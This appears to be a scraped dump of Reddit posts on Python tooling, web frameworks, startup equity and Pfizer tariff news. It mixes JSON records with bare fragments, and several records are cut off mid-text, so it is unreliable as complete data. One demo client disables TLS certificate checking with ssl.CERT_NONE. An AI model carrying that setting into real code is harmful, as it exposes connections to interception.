When I'm doing data science work, I usually need to look at the results from one cell before deciding what to write next. That's exactly what Runcell does - it analyzes your previous results and decides what code to run next based on that context.\n\n**How it's different:**\n\n* vs AI IDEs like Cursor: Runcell focuses specifically on building context for Jupyter environments instead of treating notebooks like static files\n* vs Jupyter AI: Runcell is more of an autonomous agent rather than just a chatbot - it has tools to actually work and take actions\n\nYou can try it with just `pip install runcell`.\n\nI'm looking for feedback from the community.

With this, my team decided to switch to explicitly import fixtures into each test-file instead of relying on them \"magically\" existing everywhere. Sounds like a good plan, makes things more explicit and easier to understand for newcomers. Initial testing looks good, everything works.\n\nI commit, the full testsuit runs over night. Next day I come back to most of the tests erroring out. Each one with a connection error. \"But that's impossible?\" We use a scope of session for your connection, there's only one connection for the whole testsuite run. There can be a couple of test running fine and than a bunch who get a connection error. How is the fixture re-connecting? I involve my team, nobody knows what the hecks going on here.\nSo I start digging into it, pytests docs usually suggest to import once in the `contest.py` but there is nothing suggesting other imports should't work.\n\nThan I get my Heureka: unter some obscure stack overflow post is a comment: _pytest resolves fixtures by their *full* import path, not just the symbol used in the file_. What? \n\nBut that's actually why non of the session-fixtures worked as expected. Each import statement creates a new fixture, each with a different import-path, even if they all look the same when used inside tests. Each one gets initialised seperatly and as they are scoped to the session, only destroyed at the end of the testsuite. Great... So back to global imports we went.\n\nI hope this helps some other tormented should and shortens the search for why pytest fixtures sometimes don't work as expected.

{"post_id": "1nqnm44", "title": "PEP 806 – Mixed sync/async context managers with precise async marking", "content": "PEP 806 – Mixed sync/async context managers with precise async marking\n\n[https://peps.python.org/pep-0806/](https://peps.python.org/pep-0806/)\n\n# Abstract\n\nPython allows the `with` and `async with` statements to handle multiple context managers in a single statement, so long as they are all respectively synchronous or asynchronous. When mixing synchronous and asynchronous context managers, developers must use deeply nested statements or use risky workarounds such as overuse of [`AsyncExitStack`](https://docs.python.org/3/library/contextlib.html#contextlib.AsyncExitStack).\n\nWe therefore propose to allow `with` statements to accept both synchronous and asynchronous context managers in a single statement by prefixing individual async context managers with the `async` keyword.\n\nThis change eliminates unnecessary nesting, improves code readability, and improves ergonomics without making async code any less explicit.\n\n# Motivation\n\nModern Python applications frequently need to acquire multiple resources, via a mixture of synchronous and asynchronous context managers. While the all-sync or all-async cases permit a single statement with multiple context managers, mixing the two results in the “staircase of doom”:\n\n    async def process_data():\n        async with acquire_lock() as lock:\n            with temp_directory() as tmpdir:\n                async with connect_to_db(cache=tmpdir) as db:\n                    with open('config.json', encoding='utf-8') as f:\n                        # We're now 16 spaces deep before any actual logic\n                        config = json.load(f)\n                        await db.execute(config['query'])\n                        # ... more processing\n\nThis excessive indentation discourages use of context managers, despite their desirable semantics. See the [Rejected Ideas](https://peps.python.org/pep-0806/#rejected-ideas) section for current workarounds and commentary on their downsides.\n\nWith this PEP, the function could instead be written:\n\n    async def process_data():\n        with (\n            async acquire_lock() as lock,\n            temp_directory() as tmpdir,\n            async connect_to_db(cache=tmpdir) as db,\n            open('config.json', encoding='utf-8') as f,\n        ):\n            config = json.load(f)\n            await db.execute(config['query'])\n            # ... more processing\n\nThis compact alternative avoids forcing a new level of indentation on every switch between sync and async context managers. At the same time, it uses only existing keywords, distinguishing async code with the `async` keyword more precisely even than our current syntax.\n\nWe do not propose that the `async with` statement should ever be deprecated, and indeed advocate its continued use for single-line statements so that “async” is the first non-whitespace token of each line opening an async context manager.\n\nOur proposal nonetheless permits `with async some_ctx()`, valuing consistent syntax design over enforcement of a single code style which we expect will be handled by style guides, linters, formatters, etc. See [here](https://peps.python.org/pep-0806/ban-single-line-with-async) for further discussion.", "author": "kirara0048", "subreddit": "Python", "score": 177, "upvote_ratio": 0.99, "num_comments": 22, "created_utc": "2025-09-26T09:44:27", "url": "https://www.reddit.com/r/Python/comments/1nqnm44/pep_806_mixed_syncasync_context_managers_with/", "permalink": "https://reddit.com/r/Python/comments/1nqnm44/pep_806_mixed_syncasync_context_managers_with/", "is_self": true, "domain": "self.Python", "tech_keywords": ["AI", "AR", "python"], "crawled_at": "2025-10-03T13:57:09.209437", "sentiment_score": {"vader_compound": 0.5226, "vader_positive": 0.049, "vader_neutral": 0.915, "vader_negative": 0.036, "textblob_polarity": 0.06713466713466712, "textblob_subjectivity": 0.39423481923481934, "overall_sentiment": "positive"}},

{"post_id": "1nr3qvm", "title": "Pytrithon: Graphical Petri-Net Inspired Agent Oriented Programming Language Based On Python", "content": "# What My Project Does\nPytrithon is a graphical petri-net inspired agent oriented programming language based on Python. Do not worry, there is no need to understand formal petri-nets, the language instead is only inspired by them and is very simple and intuitive. Instead of a tree structure of linear code files, you have multiple Agents, each being a two dimensional graphical Pytri net, which cooperate with eachother. Pytrithon introduces native inter Agent communication into the core language as a first class member. You can directly model the actual control flow of an Agent which frees you from the strict linear recursive method calling of Python and enables many more modes of structuring the code. The Pytri nets you will create are very intuitive and readable, just by looking at them you can directly understand how the Agents operate, you don't need to browse the code as you do in plain Python and jump from file to file, method to method, desperately trying to reverse engineer how the code works. There are Places which store intermediate and global data and there are subtypes which express different use cases of variables, like queues and stacks. Pytrithon has many different Transitions, which are the actors of an Agent and are triggered by Places. The main Python Transition allows you to directly assign an arbitrary Python snippet as an action and allows for the powerful triggering of other parts of the Pytri net through supression. There also are different types of Tansitions which embody different kinds of intra Agent control flow, like an explicit if or switch, sending and receiving a signal, defining and using the Pytri net equivalent of a method, a Nethod. For inter Agent communication there are Transitions for sending and receiving arbitrary Python objects inbetween Agents, and the Task abstaction allows for an Agent to offer a service to other Agents which can be utilized as a single Transition on the caller's side. What makes a Pytri net so graspable is that all the control flow is apparent through explicit graphical Arcs, which connect Places to Transitions and hint at what follows what. Entire Pytri nets can be turned into Fragments and embedded into any Agent to modularize Pytrithon code. Ontology Concepts can be defined by stating their slots and are used to encapsulate data. One of Pytrithon's strengths is that you can monitor and manipulate Agents through the Monipulator, even during their execution, and can see the state of an Agent by viewing the contents of Places inside its Pytri net.\n# Target Audience\nPytrithon is for developers of all skill levels who want to try something new. Experienced Python programmers should value the new expressiveness it offers and know intuitively how to operate it. It is especially suited for Python beginners who want to kickstart into a much mightier language and want to learn about Agents communicating with one another on the fly. Pytrithon is an universal programming language which can be used for anything Python can be used for. It is suitable for quick prototyping, since you can directly embed GUI widgets into an Agent, but can also be used for more demanding and complex use cases, exemplified by TMWOTY2, a full Pygame game, which runs at 60 frames per second across 6 different Agents.\n# Why I Built It\nAt university I got introduced to a formal Petri net tool which was there used to learn about Petri nets and agent oriented programming, with which we implemented a Settlers game. I really enjoyed the expressiveness of Petri nets but found out that its formal nature made simple tasks very complicated. There were huge structures just to send data from one agent to another and you had to understand Petri nets in depth. I wanted something similar but way more intuitive and terse and adapted it into the Pytrithon language for more than 15 years now by rethinking how to integrate it deeply with Python.\n# Comparison\nNothing compares to Pytrithon, it is its very own thing. Most textual programming languages are based on linear files. Most graphical programming languages do not allow embedding arbitrary code and are just glorified parametrized flowcharts.\n# How To Explore\nAt least Python 3.10 is required to run all example Agents. The install script should install all required packages. Then you can run the pytrithon script to open up a Monipulator and check out the example Agents by hitting ctrl-o. If you prefer using the console, run 'python nexus -m &lt;agentname&gt;'. Recommended Agents to try are: \"basic\", \"calculator\", \"kniffel\", \"guess\", \"pokerserver\" + multiple \"poker\", \"chatserver\" + multiple \"chat\", \"image\", \"jobapplic\", and \"nethods\". There are also scripts for running and editing TMWOTY2. Your focus should be on the workbench folder, Pytrithon is just the backstage where the magic happens.\n# GitHub Link\nhttps://github.com/JochenSimon/pytrithon\n---\nWhen you give it a try, I would really appreciate feedback, because I have not had any yet, since I only recently found the courage to present it. I welcome being told of any problems when installing and running it, so that I can fix them and they do not bother people anymore. I would enjoy hearing your opinions and ideas for improvement, it would mean a lot to me if you explore several of the example Agents. I welcome any questions and would love to answer them.", "author": "Pytrithon", "subreddit": "Python", "score": 6, "upvote_ratio": 0.72, "num_comments": 3, "created_utc": "2025-09-27T00:04:32", "url": "https://www.reddit.com/r/Python/comments/1nr3qvm/pytrithon_graphical_petrinet_inspired_agent/", "permalink": "https://reddit.com/r/Python/comments/1nr3qvm/pytrithon_graphical_petrinet_inspired_agent/", "is_self": true, "domain": "self.Python", "tech_keywords": ["AI", "AR", "python"], "crawled_at": "2025-10-03T13:57:09.233484", "sentiment_score": {"vader_compound": 0.9949, "vader_positive": 0.074, "vader_neutral": 0.913, "vader_negative": 0.012, "textblob_polarity": 0.12289522206188874, "textblob_subjectivity": 0.4451372187483296, "overall_sentiment": "positive"}},

{"post_id": "1nqrmrd", "title": "Show r/Python: PyWebTransport – The canonical, async-native WebTransport stack for Python.", "content": "Hi everyone,\n\nI'm excited to share `PyWebTransport`, a modern, async-native networking library for Python. It's designed as a powerful alternative to WebSockets, leveraging the QUIC protocol to solve issues like head-of-line blocking and provide more versatile communication patterns.\n\nThe project is open-source, fully documented, and available on PyPI. It provides a high-level, asyncio-native API for the WebTransport protocol, allowing you to build high-performance, real-time network applications.\n\n### What My Project Does\n\n`PyWebTransport`'s main features include:\n\n- **Full Async Support**: Built from the ground up on asyncio for high-performance, non-blocking I/O.\n- **High-Level Frameworks**: Includes a ServerApp with routing and middleware, and a versatile WebTransportClient with helpers for pooling, auto-reconnection, and proxying.\n- **Advanced Messaging**: Built-in managers for Pub/Sub and RPC (JSON-RPC 2.0 compliant), plus pluggable serializers (`JSON`, `MsgPack`, `Protobuf`) for structured data.\n- **Complete Protocol Implementation**: Full support for bidirectional and unidirectional streams, as well as unreliable datagrams.\n- **Lifecycle and Resource Management**: Robust, async context-managed components for handling connections, sessions, streams, and monitoring.\n- **Event-Driven Architecture**: A powerful EventEmitter and EventBus system for decoupled, asynchronous communication between components.\n- **Type-Safe and Tested**: A fully type-annotated API with extensive test coverage (unit, integration, E2E) to ensure reliability and maintainability.\n\n### Target Audience\n\nThis library is intended for developers building **high-performance, real-time network applications** in Python.\n\nIt is designed with production use cases in mind. Features like robust resource management to prevent leaks, detailed statistics for monitoring, and the auto-reconnect client are all included to support stable, long-running services.\n\n### Comparison\n\nThe main alternative is WebSockets. `PyWebTransport` differs by leveraging QUIC to offer:\n\n- **No Head-of-Line Blocking**: Because it supports multiple, independent streams, a slow or large message on one stream doesn't block others.\n- **Unreliable Datagrams**: It provides a datagram API for sending low-latency, non-guaranteed messages, which WebSockets doesn't offer. This is ideal for things like real-time game state or voice data.\n- **Unidirectional Streams**: It supports write-only and read-only streams, which can be more efficient for certain application patterns, like a client sending a continuous stream of telemetry.\n\n### A Quick Look at the API\n\n#### Server (`server.py`)\n\n```python\nimport asyncio\n\nfrom pywebtransport import (\n    ConnectionError,\n    ServerApp,\n    ServerConfig,\n    SessionError,\n    WebTransportSession,\n    WebTransportStream,\n)\nfrom pywebtransport.utils import generate_self_signed_cert\n\ngenerate_self_signed_cert(hostname=\"localhost\")\n\napp = ServerApp(\n    config=ServerConfig.create(\n        certfile=\"localhost.crt\",\n        keyfile=\"localhost.key\",\n        initial_max_data=1024 * 1024,\n        initial_max_streams_bidi=10,\n    )\n)\n\n\nasync def handle_datagrams(session: WebTransportSession) -&gt; None:\n    try:\n        datagram_transport = await session.datagrams\n        while True:\n            data = await datagram_transport.receive()\n            await datagram_transport.send(data=b\"ECHO: \" + data)\n    except (ConnectionError, SessionError, asyncio.CancelledError):\n        pass\n\n\nasync def handle_streams(session: WebTransportSession) -&gt; None:\n    try:\n        async for stream in session.incoming_streams():\n            if isinstance(stream, WebTransportStream):\n                data = await stream.read_all()\n                await stream.write_all(data=b\"ECHO: \" + data)\n    except (ConnectionError, SessionError, asyncio.CancelledError):\n        pass\n\n\n@app.route(path=\"/\")\nasync def echo_handler(session: WebTransportSession) -&gt; None:\n    datagram_task = asyncio.create_task(handle_datagrams(session))\n    stream_task = asyncio.create_task(handle_streams(session))\n    try:\n        await session.wait_closed()\n    finally:\n        datagram_task.cancel()\n        stream_task.cancel()\n\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=4433)\n\n```\n\n#### Client (`client.py`)\n\n```python\nimport asyncio\nimport ssl\n\nfrom pywebtransport import ClientConfig, WebTransportClient\n\n\nasync def main() -&gt; None:\n    config = ClientConfig.create(\n        verify_mode=ssl.CERT_NONE,\n        initial_max_data=1024 * 1024,\n        initial_max_streams_bidi=10,\n    )\n\n    async with WebTransportClient(config=config) as client:\n        session = await client.connect(url=\"https://127.0.0.1:4433/\")\n\n        print(\"Connection established.

{"post_id": "1nqko2g", "title": "An Empirical Study of Type-Related Defects in Python Projects [pdf]", "content": "https://rebels.cs.uwaterloo.ca/papers/tse2021_khan.pdf\n\n**Abstract**: In recent years, Python has experienced an explosive growth in adoption, particularly among open source projects. While\nPython’s dynamically-typed nature provides developers with powerful programming abstractions, that same dynamic type system\nallows for type-related defects to accumulate in code bases. To aid in the early detection of type-related defects, type annotations were\nintroduced into the Python ecosystem (i.e., PEP-484) and static type checkers like mypy have appeared on the market. While\napplying a type checker like mypy can in theory help to catch type-related defects before they impact users, little is known about the\nreal impact of adopting a type checker to reveal defects in Python projects.\nIn this paper, we study the extent to which Python projects benefit from such type checking features. For this purpose, we mine the\nissue tracking and version control repositories of 210 Python projects on GitHub. Inspired by the work of Gao et al. on type-related\ndefects in JavaScript, we add type annotations to test whether mypy detects an error that would have helped developers to avoid real\ndefects. We observe that 15% of the defects could have been prevented by mypy. Moreover, we find that there is no significant\ndifference between the experience level of developers committing type-related defects and the experience of developers committing\ndefects that are not type-related. In addition, a manual analysis of the anti-patterns that most commonly lead to type-checking faults\nreveals that the redefinition of Python references, dynamic attribute initialization and incorrectly handled Null objects are the most\ncommon causes of type-related faults. Since our study is conducted on fixed public defects that have gone through code reviews and\nmultiple test cycles, these results represent a lower bound on the benefits of adopting a type checker. Therefore, we recommend\nincorporating a static type checker like mypy into the development workflow, as not only will it prevent type-related defects but also\nmitigate certain anti-patterns during development", "author": "ketralnis", "subreddit": "Python", "score": 8, "upvote_ratio": 0.73, "num_comments": 3, "created_utc": "2025-09-26T07:30:04", "url": "https://www.reddit.com/r/Python/comments/1nqko2g/an_empirical_study_of_typerelated_defects_in/", "permalink": "https://reddit.com/r/Python/comments/1nqko2g/an_empirical_study_of_typerelated_defects_in/", "is_self": true, "domain": "self.Python", "tech_keywords": ["AI", "AR", "python", "javascript", "growth"], "crawled_at": "2025-10-03T13:57:09.284974", "sentiment_score": {"vader_compound": -0.6854, "vader_positive": 0.079, "vader_neutral": 0.829, "vader_negative": 0.092, "textblob_polarity": 0.12330586080586083, "textblob_subjectivity": 0.4597985347985347, "overall_sentiment": "negative"}},

{"post_id": "1nja94c", "title": "Designing a State Manager for Performance: A Deep Dive into Hierarchical Reactivity", "content": "Hey /r/javascript,\n\nI wanted to share a write-up on an architectural pattern for managing state in complex, event-driven applications and get some feedback from the community here.\n\nA common problem in UI programming is that as an application's state becomes more complex, the work required to calculate updates can start to interfere with the responsiveness of the user interface. This often leads to dropped frames (jank) and a degraded user experience.\n\nThe linked article is a deep dive into an architecture designed to solve this by combining two well-known programming concepts in a specific way:\n\n**1. Concurrency:** The entire state model and all its related computations are moved off the main UI thread and into a separate worker thread. The UI thread is treated as a simple \"view layer\" whose only job is to render, based on minimal, batched messages it receives from the worker. This architecturally isolates the UI from the application's computational load.\n\n**2. Metaprogramming for Automatic Reactivity:** Instead of requiring developers to manually declare which parts of the state a UI component depends on (e.g., via dependency arrays or manual subscriptions), the system uses metaprogramming (specifically, JavaScript Proxies) to intercept property access at runtime. This allows the system to automatically build a precise dependency graph. When a piece of state changes, only the *exact* computations and UI components that depend on it are notified to update.\n\nThe article explores how these two ideas work together, using a real-world implementation as a case study.\n\nI'm curious to hear your thoughts on the pattern itself, beyond any specific language or framework:\n\n*   What are the trade-offs you see in a heavily concurrent UI architecture like this? (e.g., memory overhead, debugging complexity).\n*   How does this \"automatic dependency tracking\" via proxies compare to other reactive systems you've worked with (e.g., RxJS, or patterns in other languages)?\n*   Are there other domains outside of UI where this combination of concurrency and automatic reactivity could be particularly powerful?\n\nLooking forward to the discussion.", "author": "TobiasUhlig", "subreddit": "javascript", "score": 3, "upvote_ratio": 0.62, "num_comments": 1, "created_utc": "2025-09-17T20:14:52", "url": "https://github.com/neomjs/neo/blob/dev/learn/blog/v10-deep-dive-state-provider.md", "permalink": "https://reddit.com/r/javascript/comments/1nja94c/designing_a_state_manager_for_performance_a_deep/", "is_self": false, "domain": "github.com", "tech_keywords": ["AI", "AR", "javascript", "react", "share"], "crawled_at": "2025-10-03T13:57:09.313327", "sentiment_score": {"vader_compound": 0.5622, "vader_positive": 0.035, "vader_neutral": 0.943, "vader_negative": 0.022, "textblob_polarity": -0.002430555555555554, "textblob_subjectivity": 0.4954365079365079, "overall_sentiment": "positive"}},

I really like the programming model &amp; I know a lot of seasoned svelte devs don't like 5 but i did. I was happy the meta framework (sveltekit) was maintained by the core devs rather than another group. My primary FE framework is vue. \n\nThe one BIG thing that has kind of turned me off has to deal with the svelte dev tools. So Svelte 5 was released almost a year go. During the beta/rc time a github issue was created (april 2024) because the dev tools don't work with svelte 5 at all:  \n[https://github.com/sveltejs/svelte-devtools/issues/193](https://github.com/sveltejs/svelte-devtools/issues/193)\n\nThey have commited to it:\n\n&gt;It's on the radar, we're trying to stabilize Svelte 5 first before we do any work on the integration\n\nBut like i said Svelte 5 was released about a year ago (October 2024) &amp; the commitment to the dev tools was made in april 2024 so well over a year. Its not like i constantly use the vue tools but i do use them frequently when i run into hairy issues. IMO the dev tools are an integral part &amp; should have been released on day 1 if not soon after. I've been watching the project for awhile.

They got a business unit operating hundreds of student influencers campaigns for brands, with some early revenue (low six figures) but issues in execution and scale.\n\nI was called to fix the BU but we got this exciting idea, to expand and consolidate the BU. The idea is to go beyond one-off brand ambassador projects and build a proper staffing platform for students and young people, essentially matching them with short-term marketing and brand gigs. We are also strongly linked with some of the major companies operating in the Events industry, so we can find there also some more traditional gigs to offer.\n\nThe opportunity is strong because the company through their main business already has access to a huge pool of students/young users and established brand clients. We’re in one of Europe’s top markets, so the scale potential is capped but we have some room to expand rapidly in our market.\n\nMy background: i’m in my mid twenties, started just last year to have a living income. Not very solid though till this year. I’ve recently built a small strategic consulting practice that was picking up momentum (including work in fundraising, where I’ve helped raise close to €1M). I also run a small beverage startup since 2023, but it’s moving slowly and I don’t see it as my main focus in the short term due to market conditions and not grinding partners. To commit to this new project, I’d pause new consulting work and focus full-time here.\n\nThe plan: •\tPhase 1: 3–6 months MVP build. I’d get a modest stipend, 5/7k of monthly operating budget, legal/admin covered, and one junior internal resource. If no NewCo is formed, they’d retain the assets, with me compensated through a buy-out. •\tPhase 2: If KPIs are hit, NewCo is incorporated alongside a seed round. Rough split: ~60% corporate / ~40% me pre-seed, then 34–38% for me post-seed (5–15% dilution). I’d be CEO with standard vesting.\n\nConcerns: they understand the budget proposal but aren’t 100% comfortable yet. At the same time, they bring a big upside: access to millions of unique users in target plus strong brand clients.\n\nQuestions: Is this equity split fair for an EIR spin-out? Am i asking enough? Is a corporate partner this invested a block for future fundraising? How should a buy-out be structured if they keep the assets but don’t spin out? Anything else i should be aware of/suggesting before signing contracts?\n\nMy first experience working as EiR and with corporate partners so any tip and experience is loved!", "author": "MysteriousTown8866", "subreddit": "startups", "score": 2, "upvote_ratio": 0.76, "num_comments": 0, "created_utc": "2025-09-30T07:01:05", "url": "https://www.reddit.com/r/startups/comments/1ntvgo7/entrepeneur_on_residence_1st_experience/", "permalink": "https://reddit.com/r/startups/comments/1ntvgo7/entrepeneur_on_residence_1st_experience/", "is_self": true, "domain": "self.startups", "tech_keywords": ["AI", "AR", "equity", "revenue"], "crawled_at": "2025-10-03T13:57:09.350144", "sentiment_score": {"vader_compound": 0.9921, "vader_positive": 0.105, "vader_neutral": 0.872, "vader_negative": 0.024, "textblob_polarity": 0.12159914361001316, "textblob_subjectivity": 0.4136452315800142, "overall_sentiment": "positive"}},

Family on their back, unsure of the path, but hungry for freedom. I’ve been there. Here’s the blueprint I wish someone gave me then:\n\nStart small. Don’t blow the whole amount. $3k is enough to buy you 6 months: a domain, website, waitlist page, custom email, incorporation, maybe a desk at an incubator. Keep $12k for your family. That’s survival, not startup money.\n\nDon’t go solo. Find a co-founder who shares the fire. Not someone desperate for a quick paycheck, but someone who can stand in the dark with you at 2 a.m. Lone wolves burn out.\n\nPick a problem screaming for a solution in your domain. If you’re a recruiter, think matchmaking for startup co-founders. If you’re an engineer, find the bug in the system that people actually curse about. Build for pain, not applause.\n\nAnd yes, credits are gold. Once you register and get into the right incubator or program, you can unlock serious resources: GitHub, Google Cloud, Microsoft for Startups, AWS, Notion, HubSpot. That’s not cash, but it’s oxygen.\n\nNow validate. Talk to customers, test GTM, map competitors. If the signs point positive, pitch angels within 6–12 months for $200k+. If not, pivot before you waste more time.\n\nThis won’t be smooth. You’ll face burns, bruises, betrayals. Teams that vanish. Investors that ghost. Friends who won’t understand. But if you endure, something shifts: the pain turns addictive. Freedom does that. Once you’ve tasted it, scars stop hurting.\n\nBecause the real prize isn’t just a term sheet.

On top of that, it is not an easy task to develop complex models on the black-box commercial codes.\n\nFinally, I decided to create a light-weight, modern C++ alternative of A, say B (classes now are based on: expression template, simd, OMP, etc), focusing only on the core functionalities. Plus, high-level APIs are compatible with the legacy open-source code A, which lowers the barrier significantly for new users.\n\nPlus, to support multi-phase systems, I developed the code C: there are no open-source alternatives that have advanced features like mine (published 3 papers in this field).\n\nSo I plan to use the independently developed codes combo: B, C, and the coupling scheme of B+C, to build a startup with the full-stack codebase, targeting the niche market of B+C coupling.\n\nIs this attractive to investors?

[I Will Not Promote]", "content": "\\[Update - 10/2/2025\\]: So I had a discussion with the guys, laid out my reasons for asking and also pointing towards what I will do in the future. They agreed to make me a cofounder with much more ownership than what was first offered.\n\nJust wanted to thank you guys for whipping me into shape and giving me the courage to ask for what I thought was fair. Now, this could still crash and burn, but at least I'm on the ship I helped build.\n\n  \n\\[Original Post\\]:\n\nHeya folks, I'm going to try to keep things somewhat anonymous and exclude exact markets that we are working in and such. So forgive some of the vagueness but I hope I can give enough information about my situation. Also apologies for verboseness of this, I feel like these details are important to understand my anxiety. I have included a TL;DR below.\n\nSo I worked with a group of developers, doing consults, contracts, essentially being a strike team for companies that need engineering resources. I've worked within this group for several years before now. Last year, one contract I was working on ended and we were unable to have another one lined up for me. But I knew we had a few projects that we were working on in the background. One of the projects actually perfectly fitted what I do. So I decided to put as much as my time into it as I could. However, there were some pretty tough considerations.\n\nThe project had practically 0 funding at the time, it's still pre-seed, I would be responsible for my own finances while working on the project. I had to take out some loans and take some risks to keep my lights on and food on the table. We recently started getting small amounts of funding, but still hasn't been enough to really stabilize my financial situation. I've gone unpaid essentially for almost 6-7 months, and even now about a year later I'm still not getting fully paid.\n\nThere are a total of 3 core members:\n\nFounder #1 CEO, an engineer like myself.\n\nFounder #2 CTO, a very knowledgeable engineer as well, does suggest overall technological approaches in the market we are starting in.\n\nMyself, I think it's safe to say I am something of a Founding Engineer. Although Founder #1 has written some of the initial code base, the very base general idea, I have more domain knowledge in the market we are working in and wrote the most of the implementation code and such.\n\nWithin the first month or two of working on the project, I implemented first 2 or so major milestones. These were even used as part of finding VCs and funding. It was even presented at conferences, though behind closed doors. Bringing everything up to speed to now, I've written mostly all the important implementations that are shown to our partners, investors, and future connections. Founder #1 has helped with some of these things even with code, but I believe I can claim ownership of at least 80% of the codebase.\n\nI have also been asked to go to a couple of conferences as well which I was happy to do.\n\nI feel like more than just a normal engineer hire #1. A founding engineer? Perhaps, but I have asked myself, \"would the startup have been successful without me?\" I actually think so, yes. Someone else could have come in later and done what I did if the project wasn't shuttled before then, but \"would the startup be where it is right now without me?\" I'm confident in saying no. I was definitely the right person in the right place to make this take off to where we are today.\n\nWe did create a compensation agreement to convert an hourly rate to safety notes. It was a 0 funding start, however recently we have been getting some actual funding. Nothing to jump for joy for, but we started getting paid a little. I've also been thinking of asking the other guys about my potential ownership and if I can take a bigger role. Well, a week ago they told me they were thinking of giving me 1% equity. At first, I thought it was an okay deal, but as I thought about it, I was starting to feel like 1% maybe is a bit too small.\n\nI recognize that I'm not taking any of the real financial or legal risk, though I do feel like I did take a very real risk by working without pay for almost a year. I also see that my work is very valuable and has already secured investments and deals. I don't have the connections, but I am taking a part in conferences and general spreading the word.\n\nWhile I wouldn't really seek to be considered a founder, I do feel like 1% is a bit low based on my efforts and basically starting with the startup at the very beginning. I was thinking of asking for at least 3%, perhaps with conditions even but I'm wondering if this is a wise decision.\n\nTL;DR\n\nI'm a core member of a team of 3 (CEO, CTO, Engineer (me))\n\nI'm effectively a day 0 member\n\nStarted at 0 funding with only a light, initial code base\n\nPersonal financial risk, no pay for almost a year (limited pay after 6-7 months)\n\nBuilt out mostly all of the current code base, around 80% give or take a few percent\n\nNot only the base code, but also peripheral software to answer partner needs\n\nJust about everything shown to investors is directly linked to my work\n\nI have also done conferences, presenting our product\n\nAlthough one of the founders is technical and has committed code and development to the base product. I have more domain knowledge in the market we are working in.\n\nWas at first getting safety notes based on agreed upon hourly rate but now being offered 1%\n\nDefinitely not a bad deal, but based on my contribution, I feel like I should ask for more.\n\nI want to ask for 3%\n\nAm I crazy for asking for more?

I have built two successful SAAS in the trucking industry, both hitting around $30k MRR each. But for every success, I continuously failed at many other SAAS products that taught me even more. \n\n1. Have a Distinguished Distribution Method First\n\nIf you do not have a distinguished distribution method for the product, you might as well not build it. Too many coders, myself included, focus on development and assume the product will sell itself, especially not your MVP. You must have a clear plan to get in front of users before you write the first line of code.\n\n2. Solve Painful Problems, Not Your Own Itch\n\nWhen looking for ideas, start with discovering genuinely painful problems. It is tempting to begin with solving your own itch, but most of those problems are just vitamins, or nice to have solutions. The real money is in creating painkillers that solve a deeply frustrating or expensive issue for a specific market.\n\n3. Differentiate or Don't Bother Copying\n\nNever copy anyone else's idea without a major differentiation in the product or your market approach. Too many copy cat products just enter the market and dilute the service for everyone.  Find a unique angle or do not compete.\n\n4. Talk to Prospective Customers Before Developing the MVP\n\nStart with talking to prospective customers, not with developing the MVP. I made this mistake so many times. You must refine your idea and deeply understand the problem from their perspective first. This single step will make it so much easier for you to have a successful launch.\n\n5. Charge If It Is a Painful Enough Problem\n\nAlways charge customers for your product. With things like AI API costs that add up, a free model is rarely sustainable. More importantly, if people are not willing to pay for your product, it simply does not solve a painful enough problem for them. Payment is the ultimate form of validation.\n\nI hope you can learn from my past experiences and not make the same mistakes I did, since I wasted months.\n\nLet me know what mistakes you have made ", "author": "MinuteDistribution31", "subreddit": "startups", "score": 3, "upvote_ratio": 0.67, "num_comments": 6, "created_utc": "2025-09-28T06:05:59", "url": "https://www.reddit.com/r/startups/comments/1ns6cdg/what_i_wish_i_knew_before_building_my_company_i/", "permalink": "https://reddit.com/r/startups/comments/1ns6cdg/what_i_wish_i_knew_before_building_my_company_i/", "is_self": true, "domain": "self.startups", "tech_keywords": ["AI", "AR", "share"], "crawled_at": "2025-10-03T13:57:09.441021", "sentiment_score": {"vader_compound": -0.7742, "vader_positive": 0.13, "vader_neutral": 0.736, "vader_negative": 0.134, "textblob_polarity": 0.09817546583850931, "textblob_subjectivity": 0.5756469979296065, "overall_sentiment": "negative"}},

Chief Executive Officer Albert Bourla said the company secured a three-year grace period from President Donald Trump’s promised tariffs on pharmaceuticals in a deal that would lower some of its US drug prices.\n\nThe company will sell some products at a 50% average discount on a direct-to-consumer website called TrumpRx, an initiative intended to allow Americans to pay cash for drugs at discounted rates negotiated by the government.\n\nThe deal appears to resolve two major threats facing Pfizer, as it would stave off more damaging drug pricing policies while shielding the company from future tariffs imposed by the administration’s Section 232 investigation into whether the cost of medicine represents a national security threat. \n\nIt’s the latest example of the transactional nature of winning tariff exemptions from Trump, who has unilaterally wielded trade policy to exert power over multiple industries. As recently as last week, Trump threatened 100% tariffs on the industry. \n\nAs part of its deal, Pfizer will offer across-the-board reductions on US prices for Americans enrolled in the Medicaid insurance program, giving them “most favored nation” pricing on some of its medicines, Trump said. He has repeatedly pressured companies to bring their US prices in line with what foreign countries pay for medicines.\n\n“The United States is done subsidizing the health care of the rest of the world,” Trump said.\n\nBourla also announced a $70 billion push on research and development and domestic manufacturing over the next few years. The company was one of the rare exceptions among major drugmakers who rushed to highlight the return of manufacturing facilities to the US amid pressure from Trump.\n\n“We now have the certainty and stability we need on two critical fronts, tariffs and pricing, that have suppressed the industry’s valuations to historic lows,” Bourla said in a statement.", "author": "cxr_cxr2", "subreddit": "stocks", "score": 422, "upvote_ratio": 0.96, "num_comments": 144, "created_utc": "2025-10-01T01:32:23", "url": "https://www.reddit.com/r/stocks/comments/1nuhymn/pfizer_gets_threeyear_grace_period_from_trump/", "permalink": "https://reddit.com/r/stocks/comments/1nuhymn/pfizer_gets_threeyear_grace_period_from_trump/", "is_self": true, "domain": "self.stocks", "tech_keywords": ["AI", "AR", "valuation"], "crawled_at": "2025-10-03T13:57:09.511223", "sentiment_score": {"vader_compound": 0.9025, "vader_positive": 0.109, "vader_neutral": 0.817, "vader_negative": 0.074, "textblob_polarity": 0.11750000000000001, "textblob_subjectivity": 0.43833333333333335, "overall_sentiment": "positive"}},

